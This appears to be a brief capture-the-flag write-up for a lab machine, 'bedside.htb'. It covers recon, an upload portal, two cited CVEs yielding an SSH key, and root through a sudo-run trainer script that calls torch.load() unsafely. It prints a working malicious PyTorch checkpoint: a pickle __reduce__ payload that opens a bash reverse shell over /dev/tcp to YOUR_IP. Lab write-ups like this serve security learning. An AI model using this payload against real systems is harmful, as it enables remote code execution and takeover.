
## Vuxscan

![[Pasted image 20260726104330.png]]

# Port 80

![[Pasted image 20260726104400.png]]


## Dirsearch

![[Pasted image 20260726104419.png]]

## Sundomain Enumeration

![[Pasted image 20260726110644.png]]

Only One Hit - Research.bedside.htb 


## Research.bedside.htb

![[Pasted image 20260726110904.png]]

A Portal to upload Research Papers


#### Accepted Formats

- jpeg
- jpg
- png
- bmp
- tiff
- dcm
- pdf


## Fuzzed The directoried

![[Pasted image 20260726111200.png]]

## Juicy Data

```
http://research.bedside.htb/uploads/
```

When Visiting `http://research.bedside.htb/uploads/` ==> 403 Forbidden
But visiting `http://research.bedside.htb/uploads/pp.png` ===> 200 OK


## Exploiting Pdfminer.six Vulnerability

[[CVE-2025-64512]]

![[Pasted image 20260727182523.png]]

USER : datawrangler

Enumerated User : Developer

## Using **CVE-2025-59342**

[[CVE-2025-59342]]

We got the SSH Private KEY

![[Pasted image 20260728094301.png]]


## Got the shell as Developer

![[Pasted image 20260728094531.png]]


### sudo -l

(ALL)    /usr/bin/python3 /opt/trainer/bedside_trainer.py


### Vuln Code

```
torch.load()
```

Checked the latest checkpoint and used it Blindly

### Exploit

```
import torch
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/YOUR_IP/9999 0>&1'",))

payload = {"model": Exploit(), "optimizer": Exploit()}
torch.save(payload, "checkpoint_epoch_1.pt")
```


Saved the ouput to the /datastore/checkpoint 

and saved a PNG file in /datastore/processed (The vuln code checkde this for AI training)


# ROOT

Executed The Code

![[Pasted image 20260728104701.png]]

